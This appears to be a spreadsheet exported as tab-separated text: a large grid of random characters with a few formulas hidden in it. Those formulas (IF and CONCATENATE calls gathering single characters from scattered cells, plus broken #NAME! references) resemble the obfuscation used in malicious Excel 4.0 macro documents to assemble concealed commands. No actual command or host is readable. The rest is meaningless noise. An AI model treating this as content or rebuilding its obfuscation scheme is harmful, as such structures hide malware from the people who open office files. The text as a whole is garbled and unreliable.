^	R	)	$	<	)	+	w	w	|	W	R	0	{	q	{	:	/	^	=	%	e	"	^	N	;
t	v	2	>	4	N	7	y	$	%	9	!	w	K	*	K	S	F	=	1	T	m	x	r	B	F
"	|	R	K	b																					
+	R	-	d	Q	I	p	T	A	H	:	[	8	.	?	'	\	!	f	n	F	t	t	5	.	_
a	+	B	R	{	e	T	-	8	,	C	c	Z	q	Y	0	2	h	M	I	\	K	#	A	v	w
#	4	L	S	\	V	k	L	a	L	M	M	z	m	4	F	}	F	\	g	p	P	|	f	*	i
\	)	-	]	]	y	P	u	s	7	W	J	c	l	?	h	Y	\	<	O	Q	\	p	!	M	/
T	z	`	=IF(#NAME!(),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))	I	4	O	E	@	e	i	)	v	}	@	%	Q	_	?	l	y	n	&	"	/	M
[	0	{	=#NAME!()	v	,	1	\	e	^	P	R	J	v	k	R	F	.	[	&	F	F	k	~	p	{
x	M	d	=#NAME!()	<	1	\	,	4	#	y	m	~	R	v	n	Y	w	a	_	<	F	-	d	#	p
n	{	h	s	>	L	l	@	h	o	E	=	T	w	^	z	x	4	g	}	r	"	c	w	8	,
&	*	~	c	`	W	K	{	:	<	9	D	)	y	^	6	,	I	!	z	m	D	!	l	w	9
T	Y	F	O	O	z	i	t	H	r	2	`	'	d	:	e	K	`	?	@	4	;	U	2	4	K
'	o	E	Z	9	Q	.	<	G	m	_	>	K	e	O	 	$	P	j	0	!	+	V	s	<	%
b	Y	=	<	x	Q	k	w	<	k	i	b	r	I	@	{	6	6	3	_	:	z	f	-	F	E
@	O	v	8	y	V	N	T	t	c	H	C	h	=	n	h	,	R	F	$	c	N	5	/	z	A
x	>	{	<	u	3	h	!	f	c	Y	h	w	R	F	#	i	l	6	P	,	h	v	~	1	M
%	R	<	*	~	,	>																			
h	(	&	!	[	W	~	M	1	e	(	(	c	O	:	7	P	v	t	!	d	(	\	/	o	8
l	o	S	#	3	_	C	R	Y	m	<	I	b	 	L	6	y	&	b	R	.	@	j	:	A	>
A	&	 	'	C	F	4	h	f	~	R	5	S	U	2	g	;	h	!	!	b	 	=	 	o	r
>	G	v	[	n	}	t	o	O	a	<	?	<	b	$	M	m	s	+	v	%	4	8	/	U	*
 	!	v	`	b	*	U	>	,	*	.	[	Q	x	`	$	l	{	y	6	=	k	V	b	M	i
%	O	Y	'	t	U	<	8	G	j	?	#	C	V	-	5	 	2	h	N	?	o	I	9	C	4
/	s	U	h	s	7	&	h	O	z	b	N	 	&	U	j	&	o	,	C	'	O	j	9	x	!
\	i	X	+	n	_	R	F	!	-	J	 	M	y	M	J	|	W	+	Y	1	 	D	k	u	W
l	z	M	<	7	$	o	c	:	:	!	u	+	T	=	u	<	/	h	D	"	?	w	(	3	G
n	`	d	Y	:	d	?	s	p	a	`	Y	@	O	z	/	d	(	U	=	C	`	9	S	[	G
.	:	p	]	9	O	k	&	@	y	3	N	,	G	1	^	7	W	u	0	{	K	j	j	i	A
5	1	_	)	k	M	k	"	m	U	x	/	!	1	h	,	p	S	.	W	'	L	q	)	"	{
.	x	.	8	D	J	)	L	A	A	R	M	K	R	l	W	@	h	s	k	t	&	%	U	!	O
;	j	f	K	=	b	i	<	-	P	;	$	h	}	|	;	 	K	1	8	K	<	J	;	y	d
w	+	g	q	K	q	i	 	^	s	-	S	=	O	N	.	9	e	N	-	Z	f	Y	`	%	>
!	y	6	9	c	0	b	,	_	h	e	|	q	g	n	G	3	m	s	T	'	1	G	0	_	#
?	a	c	t	V	$	Y	2	S	K	'	b	i	9	|	"	$	g	n	M	p	H	3	R	?	y
X	u	0	}	%	b	K	`	c	1	N	z	o	#	x	`	N	V	M	N	P	|	\	|	3	#
i	|	L	|	8	g	m	G	~	1	N	Q	B	F	|	L	h	5	/	c	D	\	!	W	2	h
x	m	B	S	g	@	L	$	@	+	N	[	{	,	5	}	L	e	!	w	;	f	s	M	g	L
&	A	[	*	2	+	.	\	3	J	<	}	L	c	*	j	8	s	Y	Y	x	2	Z	"	:	!
q	[	j	W	B	M	2	`	9	o	,	W	\	G	x	g	1	w	b	1	Z	=	Q	e	"	D
R	#	K	,	{	|	i	"	#	p	F	R	f	m	S	9	#	{	B	Z	j	2	0	M	2	P
=	'	g	k	5	t	;	e	Y	<	1	z	o	3	z	p	5	>	E	9	E	m	|	1	3	^
i	L	W	(	O	S	?	E	{	u	!	y	]	&	Y	u	x	A	n	S	]	U	G	O	}	1
X	o	{	*	{	/	f	D	p	!	$	0	]	@	s	3	p	y	d	'	@	i	|	4	(	;
o	Y	{	S	q	P	Y	f	/	q	v	6	!	U	7	p	u	{	4	K	"	E	N	V	4	Z
k	-	v	[	a	i	F	H	c	t	L	d	<	}	m	(	f	C	D	t	>	#	0	%	Q	]
/	P	\	?	@	m	`	_	u	y	G	%	2	M	&	c	/	p	W	T	v	3	u	L	R	I
]	)	X	g	z	a	e	U	8	*	-	F	J	W	n	~	s	2	A	P	<	?	#	M	+	E
!	c	%	\	 	$	$	x	i	M	?	3	g	p	f	 	Y	t	D	t	M	L	A	c	m	T
p	p	w	b	*	t	_	p	^	,	S	7	p	;	e	A	[	|	[	.	5	a	T	c	;	b
-	x	J	N	X	7	t	B	c	1	1	t	C	b	&	W	#	f	]	N	L	C	F	"	l	?
>	.	W	<	!	t	j	.	z	/	6	$	g	c	=	F	u	m	#	W	@	V	L	^	>	F
|	i	M	?	]	5	N	T	\	)	F	y	j	$	/	t	I	M	M	x	D	J	|	F	i	j
F	d	B	&	h	?	|	z	*	$	2	X	b	M	C	|	X	p	E	G	(	g	]	h	o	J
D	_	f	_	a	5	H	h	K	a	^	"	_	%	M	!	&	[	\	#	T	l	p	j	=	"
@	;	f	7	@	A	i	t	N	3	}	1	&	Y	j	M	$	s	L	<	r	}	/	m	?	=
q	h	L	.	R	U	K	R	x	.	4	c	k	:	9	H	\	I	I	\	x	;	B	S	a	E
A	Z	/	e	*	@	k	 	0	+	d	k	>	1	8	M	^	n	[	|	~	8	{	m	#	x
V	N	U	1	h	F	]	L	%	<	5	u	0	,	-	"	V	8	h	2	W	{	-	c	o	,
%	>	-	k	N	_	~	=CONCATENATE(D187,P602,Y1087,L575)	4	X	=	@	C	?	n	|	u	,	8	u	v	B	r	!	 	A
z	#	!	t	;	F	?	?	#	:	L	e	@	(	r	+	0	I	#	l	!	-	u	:	c	E
f	j	R	M	{	<	?	R	<	]	*	&	Q	,	U	n	^	p	A	%	b	\	]	^	>	v
|	Y	#	>	 	S	!	)	{	@	c	N	S	=	q	\	#	u	`	r	:	`	z	q	[	"
.	h	f	:	{	j	$	E	N	S	z	9	3	5	K	J	7	e	/	0	2	^	K	t	]	]
?	"	G	'	>	"	X	[	t	P	e	,	y	@	5	t	X	B	1	w	^	!	H	w	g	P
x	r	O	G	>	g	s	O	F	$	.	:	e	g	]	R	S	e	M	?	m	S	.	L	D	>
z	E	7	C	a	*	'	v	6	}	1	]	R	;	r	`	4	)	p	?	8	R	g	C	S	a
i	=	b	v	*	>	g	0	8	q	X	S	V	9	G	4	x	G	&	-	U	/	d	i	0	l
'	;	t	,	]	{	R	_	p	?	*	L	9	3	q	[	`	1	E	G	>	s	g	<	)	g
&	?	,	K	4	v	M	{	L	G	M	i	(	9	%	f	X	"	p	D	>	_	1	0	J	t
s	.	K	7	r	g	l	A	w	j	,	[	:	O	S	<	A	Y	u	>	!	7	I	\	H	L
*	E	K	&	v	:	|	{	'	U	[	)	A	I	:	c	J	\	w	W	L	E	A	 	n	0
i	i	l	x	*	h	!	n	@	T	)	_	^	q	e	^	.	#	(	@	&	l	9	,	Q	P
"	]	(	.	t	#	K	n	x	6	g	:	B	:	o	8	#	C	c	z	>	x	D	H	h	v
P	l	g	8	$	;	4	 	N	`	i	m	1	h	n	d	/	_	G	,	S	?	<	q	'	o
_	3	e	+	r	Q	K	F	:	W	\	-	3	=	B	J	>	/	I	X	a	)	Y	r	x	*
8	w	2	8	e	Y	P	C	f	@	.	K	[	,	-	4	9	^	f	s	A	P	:	4	k	5
i	1	A	*	u	~	M	y	3	9	Y	R	m	H	u	$	(	7	O	b	P	[	7	p	[	%
n	r	H	Q	|	-	<	z	X	>	T	j	W	{	_	i	g	>	P	,	J	 	5	{	Y	[
#	`	\	#	k	x	O	]	d	k	W	b	$	b	n	B	q	D	h	s	G	^	J	E	K	}
(	j	L	p	Y	(	o	K	[	s	9	Z	_	C	9	}	2	Y	d	0	J	^	)	`	A	=
A	X	b	'	&	m	B	$	o	a	=	8	g	/	C	%	T	:	U	R	W	Y	d	4	=	;
.	Q	X	#	{	v	?	m	o	/	O	;	k	;	)	d	E	;	5	v	:	@	6	j	W	K
s	T	:	S	h	g	M	;	<	=	Z	e	G	_	'	-	Q	U	-	~	*	e	a	M	8	}
k	a	e	K	P	P	~	*	n	%	0	;	b	d	_	f	!	z	s	 	B	t	p	y	l	'
,	Y	Z	q	l	p	"	x	C	#	^	_	#	!	s	w	]	_	j	n	U	Z	-	o	&	Z
H	C	K	f	f	1	z	I	%	-	S	9	)	q	Z	}	M	(	6	<	:	B	[	{	k	r
f	6	v	<	(	a	-	U	N	;	Z	c	q	:	9	t	T	J	<	{	/	O	P	J	l	k
*	v	'	s	e	v	{	T	N	S	X	(	 	l	i	y	b	;	r	D	Q	~	,	|	m	^
Q	\	$	w	4	&	f	[	d	D	|	$	K	v	"	Q	2	:	%	a	2	=	4	l	%	Q
,	-	/	h	2	M	^	R	{	z	r	y	b	V	Y	4	N	X	R	C	I	R	m	[	l	$
N	6	a	g	#	d	'	K	1	)	/	@	|	t	%	@	4	z	V	M	c	6	F	8	w	@
.	<	h	v	e	<	,	$	k	z	P	a	Z	p	Q	|	f	1	y	5	r	g	B	d	l	o
[	&	3	n	n	U	B	-	X	Y	`	F	Z	5	O	N	|	 	l	s	'	"	a	H	/	_
/	x	P	r	/	K	9	l	$	^	h	y	D	Q	#	 	m	I	%	/	(	^	e	U	b	{
#	4	%	j	_	;	~	)	O	N	?	A	S	Y	8	-	`	^	}	o	q	V	-	$	O	 
q	N	l	t	(	r	h	3	^	U	n	2	4	{	%	g	 	B	U	L	|	#	t	P	U	d
@	C	|	X	8	a	|	S	9	i	r	5	a	3	f	1	|	a	G	_	}	!	f	&	l	u
K	j	k	|	\	W	E	o	Z	W	E	N	h	&	c	n	>	*	d	f	L	D	k	M	7	g
v	x	[	u	)	i	s	6	!	x	Q	#	k	g	=	M	X	M	3	-	1	 	L	}	L	D
#	F	b	J	M	k	~	s	w	y	\	$	(	m	O	1	3	O	!	Q	p	j	=	:	m	7
v	O	s	s	'	W	Z	*	u	w	x	*	6	<	f	i	:	o	5	d	/	C	>	R	-	4
+	>	j	m	'	i	N	~	x	(	3	_	C	,	8	J	}	8	`	g	}	'	v	H	L	Q
4	N	\	4	w	P	'	3	k	h	<	*	D	h	K	:	E	`	s	4	}	k	(	8	=	4
g	f	4	1	@	y	}	'	d	G	'	L	I	F	5	k	D	Y	T	Q	t	f	[	4	Y	U
L	D	D	+	~	 	*	^	.	6	z	f	}	;	s	y	.	U	m	Z	"	w	P	"	}	P
(	-	8	)	d	z	k	N	S	A	a	"	P	G	>	^	0	"	t	C	H	`	P	q	x	;
y	%	f	#	U	 	O	H	a	A	t	Y	1	x	>	y	v	 	d	w	F	{	)	F	i	d
~	o	z	O	(	R	S	n	=	b	!	J	2	q	G	i	F	@	2	C	~	`	L	>	/	u
4	+	(	T	C	w	a	z	"	f	x	@	E	W	9	8	l	 	.	9	N	(	e	4	4	q
@	U	(	5	`	c	U	7	5	&	i	u	.	*	@	(	"	^	j	x	!	N	s	2	\	$
Z	y	G	W	<	j	P	E	H	,	I	b	>	G	x	L	g	T	$	"	*	7	9	v	/	w
S	%	D	_	%	h	G	v	L	p	w	b	}	D	_	X	"	'	 	M	9	F	u	3	)	{
K	P	z	&	Z	H	o	)	U	k	a	<	j	_	(	c	x	u	O	}	(	*	6	S	D	h
/	q	1	4	(	W	_	q	o	2	e	V	J	M	F	]	F	^	k	@	[	m	~	^	q	L
.	*	1	-	?	`	%	T	2	 	B	,	m	T	O	9	>	r	S	8	8	(	k	U	=	p
l	%	(	;	f	y	,	j	\	?	L	x	S	O	*	T	O	'	q	`	!	]	#	l	I	j
'	s	L	z	Z	Q	&	H	R	p	0	M	5	/	Q	n	5	A	m	@	)	3	/	<	e	=
v	f	3	q	k	;	i	R	w	:	I	T	r	i	I	#	d	.	b	=	;	J	%	R	/	8
P	4	4	!	L	^	)	:	^	D	]	f	%	|	4	p	-	h	B	X	q	n	y	(	U	-
T	T	5	=	>	s	}	p	D	a	}	c	/	y	R	<	-	G	l	K	I	y	m	D	6	=
H	!	e	o	1	V	z	7	P	'	b	f	~	h	r	^	8	W	q	c	M	X	n	<	+	}
,	[	=	 	}	p	\	&	%	1	[	[	+	'	o	r	w	`	j	V	m	J	5	p	U	s
0	Z	9	W	d	(	%	.	k	E	P	#	&	:	8	n	<	"	e	y	P	_	M	y	|	Z
^	'	 	f	<	C	2	f	@	m	w	+	+	F	3	|	}	8	7	U	m	"	;	k	>	K
S	g	A	z	a	^	:	D	4	o	[	-	>	;	,	J	r	g	\	6	T	>	H	5	G	?
M	.	|	I	"	E	B	W	7	P	;	#	e	>	>	5	:	,	;	6	_	'	x	0	W	8
P	K	K	Y	I	d	U	_	|	)	?	0	_	D	K	:	Q	V	8	L	t	"	^	-	%	,
6	:	E	x	[	)	J	A	!	m	Z	*	+	H	g	r	'	X	+	N	_	N	r	K	P	t
l	~	n	_	+	c	H	l	N	c	|	S	;	F	K	j	!	,	~	|	 	2	L	s	s	D
e	^	1	h	.	j	b	f	L	|	S	H	+	4	6	X	U	8	m	y	V	M	t	h	L	5
'	>	_	a	K	p	T	X	U	V	@	N	 	}	~	d	Z	(	>	j	O	*	t	b	f	m
(	H	f	=	.	=	`	H	U	_	6	(	f	k	w	.	b	z	~	]	%	x	N	b	m	!
 	v	Q	v	o	Z	6	P	T	T	<	7	t	<	y	s	!	x	G	-	"	v	O	P	w	M
^	^	X	{	S	~	$	f	z	b	$	N	"	p	l	9	9	N	u	g	!	}	@	R	`	U
J	w	J	:	l	n	I	4	&	0	e	w	0	l	P	"	T	E	+	z	\	s	?	,	{	!
L	q	]	#	j	k	!	`	:	+	T	W	i	(	h	d	N	;	I	t	[	z	%	J	w	:
B	L	'	.	X	s	Z	q	P	"	b	K	R	&	j	/	g	9	$	;	b	g	!	|	&	r
[	Z	m	`	H	H	n	b	A	%	6	@	'	0	@	8	?	%	K	]	$	&	o	x	}	s
$	>	}	D	s	R	3	[	-	V	}	s	f	:	,	K	/	Y	%	D	?	x	$	x	@	B
q	P	 	/	U	"	A	2	 	}	.	'	s	B	\	[	7	 	S	4	l	!	6	 	:	k
G	N	!	w	/	q	<	d	$	i	P	Y	<	{	L	~	D	b	w	r	a	V	|	#	P	L
S	u	E	e	[	l	{	C	9	U	6	<	d	=	@	4	&	[	u	A	?	6	U	A	y	9
z	"	q	m	'	R	S	s	a	|	F	k	~	g	t	+	r	!	u	e	V	2	>	V	.	F
B	r	8	9	o	w	.	^	v	d	~	Q	^	Z	&	z	v	w	\	^	:	=	O	6	C	v
T	r	O	p	)	l	`	K	_	^	F	i	/	,	$	F	+	?	;	h	i	u	R	g	`	`
T	Z	s	n	T	|	/	K	a	I	)	L	X	$	O	(	:	S	2	C	}	:	}	>	b	>
=	s	y	;	q	j	^	]	,	Q	#	L	k	Y	P	k	!	B	u	'	E	h	,	`	S	7
@	3	g	K	;	.	n	"	'	%	-	y	K	7	z	?	F	3	/	2	t	z	\	5	y	9
f	"	o	B	n	Y	l	H	6	1	h	+	)	d	^	2	i	g	?	W	&	W	f	@	g	*
9	~	B	/	{	$	5	d	 	J	I	W	)	%	_	z	2	h	C	-	E	9	|	j	]	/
S	4	|	x	\	9	J	/	{	y	%	@	h	|	[	i	%	=	?	)	5	j	:	p	w	W
Q	4	M	$	f	@	4	@	;	a	\	V	 	-	q	+	i	p	%	5	f	v	+	<	Y	V
i	,	!	M	S	e	\	/	B	k	|	b	h	c	A	&	+	S	Z	M	9	'	\	7	C	o
J	W	w	i	T	:	8	l	4	e	5	x	 	p	s	$	T	P	e	t	Q	+	A	N	 	[
h	`	d	9	j	i	)	:	d	_	K	$	e	H	=	/	%	.	Z	A	a	Q	*	F	v	<
r	p	3	p	]	m	g	+	{	y	$	V	&	L	A	@	>	#	2	4	8	[	X	/	`	N
D	j	i	e	)	|	q	A	!	*	w	u	-	,	A	o	T	q	 	v	7	]	a	&	e	2
E	V	A	Q	"	C	W	~	n	 	I	b	q	p	A	c	P	X	F	k	P	i	>	f	g	(
]	a	a	I	G	"	f	H	N	q	n	`	n	A	0	q	Y	v	c	l	-	~	K	 	_	>
4	1	M	r	=	Z	R	O	J	s	\	y	{	^	}	\	3	!	W	U	q	a	|	p	&	f
]	|	d	8	W	x	_	D	4	j	K	K	y	W	%	+	I	-	8	D	c	A	D	c	.	T
b	C	d	6	9	r	G	`	G	:	{	Z	j	c	x	6	(	(	5	?	/	8	C	X	]	N
{	V	4	h	,	s	@	(	q	W	k	R	`	x	2	'	9	a	w	q	]	6	'	w	"	|
r	:	Y	'	G	Y	p	j	l	^	+	0	v	k	z	;	w	y	1	O	[	t	&	2	"	N
V	h	F	w	Z	-	>	c	*	K	!	=	b	*	}	U	G	\	S	P	D	%	Q	[	`	P
X	+	-	)	M	u	B	$	Q	l	f	/	f	P	%	c	R	|	j	`	Q	H	n	Y	M	;
1	j	U	B	#	{	9	X	k	`	*	r	2	A	K	e	t	t	S	b	7	F	B	p	B	b
'	W	z	V	$	7	R	v	j	/	<	:	@	D	k	|	z	@	g	#	(	8	C	U	v	>
j	7	E	O	w	R	X	p	k	V	R	^	"	]	U	U	z	I	z	*	<	>	^	?	I	:
$	O	]	+	_	I	$	^	'	+	`	1	\	J	b	C	{	n	T	=	L	.	O	?	b	|
8	m	-	;	f	v	S	8	I	;	 	J	.	W	4	E	:	H	u	>	5	Z	P	T	}	c
R	+	f	o	*	:	;	V	`	w	a	w	{	h	{	~	]	^	8	<	~	,	n	#	w	I
Y	/	G	"	(	L	,	G	n	h	b	 	j	I	_	Z	_	]	2	>	!	V	[	m	F	)
e	4	_	>	L	K	a	.	}	Z	^	Q	y	m	b	I	+	K	F	Q	'	b	H	\	u	n
f	}	k	B	;	h	Q	@	=	T	(	z	?	f	H	/	l	3	Q	_	E	\	(	&	G	S
_	E	^	y	m	Y	2	M	4	Q	y	r	Y	-	s	i	6	A	N	b	'	#	w	u	"	B
P	{	y	z	k	=	G	O	"	L	`	^	k	I	/	j	X	R	g	!	X	 	3	@	,	v
M	E	7	H	m	n	F	:	)	h	{	n	c	K	U	+	_	^	O	a	/	"	Q	d	L	=
G	}	E	z	7	 	$	F	=CONCATENATE(E615,W1026)	j	c	}	`	q	=	l	~	H	C	j	#	]	=	6	8	S
|	3	R	o	t	k	s	-	/	4	A	h	\	5	`	8	?	4	3	y	W	k	|	(	U	!
}	N	w	v	;	b	U	#	|	"	J	U	*	@	*	"	g	f	b	f	Y	.	)	u	i	b
}	Q	C	6	9	o	s	0	C	[	;	*	0	\	'	A	o	+	"	o	V	e	O	V	R	0
;	7	_	p	e	a	l	A	i	x	k	E	f	]	J	)	*	v	$	x	X	?	P	-	y	[
1	"	-	s	x	@	K	h	<	Y	`	!	(	u	X	U	!	*	N	y	!	L	|	B	l	a
M	2	h	"	E	6	Y	j	+	F	o	$	H	,	E	g	o	?	Q	&	a	8	v	:	#	6
U	%	#	=CONCATENATE(K1036,D1095,Q603,B482)	0	i	?	'	C	)	$	o	T	o	V	7	9	L	c	i	$	(	p	H	3	Z
w	r	X	?	Y	"	t	s	l	E	Y	}	p	;	`	5	&	)	?	>	q	2	w	e	q	^
)	j	L	H	S	-	~	D	a	L	g	w	.	:	Q	1	<	4	j	|	$	.	n	q	U	w
f	5	0	8	O	h	k	0	G	o	2	6	6	B	A	h	8	2	.	4	Y	x	}	K	S	P
}	*	1	/	Y	k	!	x	{	{	E	F	I	b	c	2	M	b	D	a	E	*	o	I	c	o
c	r	z	I	A	"	F	[	\	`	;	/	r	R	o	}	u	s	f	%	[	3	Y	:	;	a
A	@	H	!	'	W	I	2	e	9	t	?	=	K	(	=	a	Z	g	P	-	\	d	)	6	Q
q	T	r	f	z	W	i	!	4	{	5	k	{	[	8	W	\	s	)	!	x	 	,	z	D	%
a	@	!	9	$	w	o	w	P	\	|	}	W	z	I	E	r	E	3	4	>	Z	t	B	A	P
%	<	`	:	x	r	8	6	.	 	D	b	G	W	W	V	(	a	N	>	4	w	K	Z	y	!
c	?	=	C	~	b	&	0	`	D	{	I	8	P	s	5	Z	\	(	:	-	-	{	.	k	#
(	H	A	p	V	%	H	Y	{	)	N	E	1	]	]	w	,	$	Z	=	S	+	V	w	s	C
2	 	{	%	o	F	D	B	8	4	;	#	e	"	5	Q	-	R	b	@	`	{	p	Z	I	E
!	*	}	M	|	{	w	C	L	5	N	K	n	|	W	-	@	t	V	R	+	L	~	v	+	T
d	e	k	Y	t	#	^	@	A	?	^	]	/	;	X	J	G	7	I	4	P	+	?	9	h	h
"	g	V	*	6	7	a	4	%	X	:	n	/	(	r	q	]	P	W	F	s	N	O	Z	E	[
Z	@	+	8	W	i	D	 	u	J	$	-	K	.	<	9	$	,	=	K	)	Z	:	~	C	/
E	N	*	L	,	z	k	f	n	=	v	w	J	Q	O	b	D	!	L	z	L	:	I	G	:	:
|	Z	H	~	G	/	d	+	&	Y	k	'	P	.	o	z	S	w	#	D	5	t	-	T	^	1
:	!	8	,	\	U	%	i	D	g	k	5	7	>	*	 	W	Z	9	$	}	%	\	Y	j	9
c	b	2	p	[	l	j	E	<	D	m	z	`	,	!	h	%	h	|	5	N	/	a	k	v	9
-	j	@	 	U	3	B	(	B	(	!	6	j	T	@	W	x	<	/	Q	n	+	J	p	{	B
P	z	J	s	D	k	J	m	7	v	[	L	/	b	5	V	i	9	$	d	f	h	4	!	|	#
{	P	0	S	9	8	 	|	r	;	z	&	}	%	^	^	a	o	O	d	c	d	C	k	)	Z
3	<	y	8	9	+	'	)	G	-	f	{	p	M	_	Z	~	c	N	c	%	F	f	s	g	H
x	c	M	o	C	 	K	i	J	P	d	P	X	j	\	4	`	u	Q	D	z	f	p	x	D	Z
)	5	E	'	X	k	K	j	V	1	e	t	y	r	g	%	G	v	n	w	=	:	V	6	g	T
@	L	)	:	V	b	L	o	<	c	\	a	z	0	|	&	2	f	 	d	.	C	x	X	2	t
a	S	H	[	=	w	r	~	.	n	\	x	[	@	A	'	|	b	:	X	[	r	G	W	P	Y
4	]	H	:	:	G	V	h	 	<	i	>	0	Y	K	y	a	N	D	t	K	C	p	;	Q	c
Z	o	$	B	`	e	)	;	!	3	k	Z	0	F	3	@	v	-	>	u	x	p	$	3	&	f
I	A	'	]	`	\	E	l	g	{	(	0	.	A	N	1	R	B	+	Y	l	Z	l	-	+	}
o	V	_	0	d	q	$	G	H	V	f	J	.	6	m	3	<	V	E	t	7	7	d	%	%	I
Q	E	E	n	Q	f	N	p	i	<	^	;	/	g	]	0	D	z	~	l	}	6	<	/	x	 
X	h	F	K	L	/	@	s	P	i	"	X	j	w	a	%	7	z	c	2	H	n	*	0	B	[
@	6	$	N	&	y	%	A	^	|	`	[	2	*	;	F	=IF(#NAME!(),TRUE(),#NAME!())	^	I	L	~	8	,	0	o	M
>	!	)	2	_	O	%	j	$	x	j	.	)	6	f	8	y	)	s	!	W	I	 	]	P	H
Y	X	#	o	F	o	3	3	"	(	'	-	~	x	&	!	w	z	D	U	A	x	7	d	G	:
*	$	I	$	E	H	t	"	 	0	"	B	Z	z	0	@	.	L	s	-	C	v	/	^	W	\
h	M	I	z	^	w	X	}	u	b	<	,	\	~	(	(	;	8	p	D	k	X	I	:	p	$
L	C	@	B	1	s	@	]	U	X	j	6	Q	x	:	z	w	6	]	.	r	[	0	{	A	H
K	i	y	^	V	!	O	v	R	i	b	P	[	)	n	8	K	*	+	:	6	W	Z	\	|	[
H	h	]	W	6	o	j	2	b	5	b	V	P	<	u	n	g	l	*	@	W	i	L	-	3	C
i	$	=	F	P	1	V	X	.	&	i	>	:	_	W	8	s	a	r	H	E	~	&	!	`	"
R	1	\	6	t	L	A	b	 	7	b	I	c	i	4	=	'	v	w	U	_	+	,	(	`	c
C	I	}	+	a	5	l	_	x	j	"	%	>	[	8	J	-	x	>	f	%	=	~	j	*	g
K	y	+	i	M	c	G	6	~	1	k	b	(	E	F	.	s	P	.	1	6	o	<	C	t	1
 	I	_	f	3	0	_	@	B	^	`	v	1	'	Y	z	G	#	=	}	M	X	x	9	j	t
E	~	o	(	<	E	R	<	t	c	>	|	m	Q	J	K	V	=	X	>	"	)	e	7	y	t
x	 	.	|	R	+	l	2	-	L	9	^	;	Z	n	Y	q	X	w	&	j	q	n	7	x	\
V	9	i	T	J	|	F	6	d	'	t	/	i	i	C	p	W	#	o	F	7	p	}	f	j	?
^	[	0	W	>	>	E	G	C	V	[	P	Y	J	z	o	4	e	_	3	x	I	X	#	6	2
B	_	Q	$	^	h	d	]	Q	}	s	^	l	O	:	c	f	c	#	Q	N	/	p	G	k	n
S	b	N	 	h	H	P	x	i	e	9	!	@	C	3	@	R	4	:	t	C	B	3	O	X	A
r	}	!	(	-	*	c	B	k	e	N	\	h	a	X	W	-	#	L	;	0	Y	>	f	Z	!
\	U	a	v	z	0	4	=	S	^	`	I	(	:	]	C	?	?	;	s	6	\	%	8	*	|
/	@	.	i	V	@	g	"	@	D	0	5	4	T	r	p	>	n	g	R	F	x	n	q	%	>
N	T	0	z	Q	,	m	g	r	U	%	r	`	h	k	t	'	|	Y	(	>	"	v	t	<	Z
W	"	B	&	/	]	h	4	<	#	*	.	 	W	a	3	k	6	[	Z	T	>	R	t	#	Y
F	q	i	|	6	s	O	;	~	F	"	<	.	\	p	m	F	r	t	E	i	!	Z	\	:	l
\	9	G	{	y	v	*	O	8	j	S	T	e	G	b	/	Z	o	n	|	 	a	>	P	9	d
|	E	m	X	r	t	%	Q	|	Q	(	:	]	8	h	<	3	d	#	\	f	m	N	C	O	)
f	#	"	a	K	z	~	a	B	@	;	^	M	D	M	+	q	]	0	b	u	\	r	[	K	o
\	B	E	4	z	$	9	3	>	q	)	i	S	R	m	>	|	 	G	S	(	+	F	*	A	n
2	E	1	0	>	h	v	Q	 	`	+	d	1	<	B	o	>	"	l	p	b	_	}	o	w	G
<	9	C	;	X	'	#	a	:	S	A	7	0	'	7	^	|	u	-	i	j	t	X	h	W	`
i	M	(	r	$	1	L	O	7	7	5	3	M	8	#	G	_	<	p	8	@	Q	\	>	d	%
a	Y	M	=	W	8	)	H	A	9	o	P	3	}	W	]	?	s	r	E	B	k	$	Y	{	A
u	k	J	u	R	*	0	n	[	.	!	&	X	!	}	Q	?	~	k	T	\	(	 	%	6	v
k	B	%	W	7	=	o	F	q	J	Z	L	^	t	A	Y	+	4	Q	A	[	r	+	'	.	_
x	v	I	(	~	u	8	6	l	U	?	$	h	|	@	y	*	p	!	J	k	e	8	#	>	Z
D	t	a	Q	t	L	?	*	Z	D	t	p	c	5	S	)	>	e	M	G	7	>	G	y	a	c
>	t	`	*	)	u	%	'	^	N	H	Y	U	9	l	%	5	|	e	y	!	e	}	O	v	T
l	m	n	~	p	o	}	"	f	#	}	v	e	0	z	_	!	=	A	'	Z	`	*	T	Y	Q
A	{	x	q	o	v	5	Q	Y	c	O	1	$	z	,	y	q	S	V	 	/	#	0	y	5	i
E	O	I	F	S	2	h	v	^	A	T	 	i	v	=	M	~	:	v	\	"	G	@	*	n	X
u	D	p	j	C	P	)	|	f	x	`	B	3	E	m	P	A	R	%	(	H	[	C	e	^	X
H	H	D	2	R	[	x	m	|	#	H	T	y	B	J	8	`	v	.	[	o	<	g	6	K	1
n	!	Y	r	e	*	}	K	)	$	Y	7	~	`	?	5	:	B	s	:	J	G	/	-	q	R
x	R	O	^	B	V	Y	i	y	M	x	_	9	n	]	Z	`	h	4	:	p	G	>	`	X	[
k	}	+	$	T	d	)	W	;	7	9	v	4	%	!	t	c	B	r	q	g	q	3	}	%	 
Y	o	^	$	;	+	$	%	x	]	@	I	j	_	u	V	#	:	_	r	O	L	Y	>	7	'
B	/	h	:	&	2	~	p	T	[	>	b	G	V	,	-	P	&	b	x	u	 	E	/	e	t
<	*	T	i	q	J	7	v	l	7	G	{	>	V	:	g	!	g	j	}	x	5	h	4	B	:
T	j	S	K	=	y	H	T	 	 	z	F	<	j	`	G	#	g	E	+	n	P	@	?	h	 
)	V	F	?	!	9	u	j	/	X	v	M	5	 	i	2	2	M	:	i	,	 	{	x	B	c
5	P	w	7	b	d	\	T	"	{	H	)	g	n	!	=	:	S	>	V	 	b	Q	-	h	<
=	+	8	S	<	G	o	G	{	T	Q	z	]	w	\	?	0	,	y	l	Q	Q	-	,	[	l
x	G	N	$	_	0	e	1	 	9	T	S	o	Z	h	G	T	V	V	+	=	N	:	t	q	$
|	t	V	X	*	x	D	&	d	h	I	A	N	O	\	=	7	a	<	E	&	G	k	\	N	W
3	B	B	l	6	j	h	^	m	m	W	L	V	'	W	U	L	B	[	r	~	O	{	'	y	B
B	n	c	T	#	f	N	i	@	 	f	[	^	d	l	$	Z	c	p	1	N	o	t	p	c	B
2	O	z	|	o	b	y	W	6	Q	9	~	m	|	j	F	5	=	5	9	=	i	#	P	p	o
h	g	o	m	T	+	H	9	L	{	E	n	X	u	J	3	+	{	 	2	?	m	f	A	}	3
~	$	 	z	C	9	f	&	m	J	g	%	z	2	5	n	e	k	9	j	7	R	0	N	<	b
C	:	)	8	*	6	!	'	2	9	-	s	F	Z	U	e	 	*	a	|	!	p	K	1	 	e
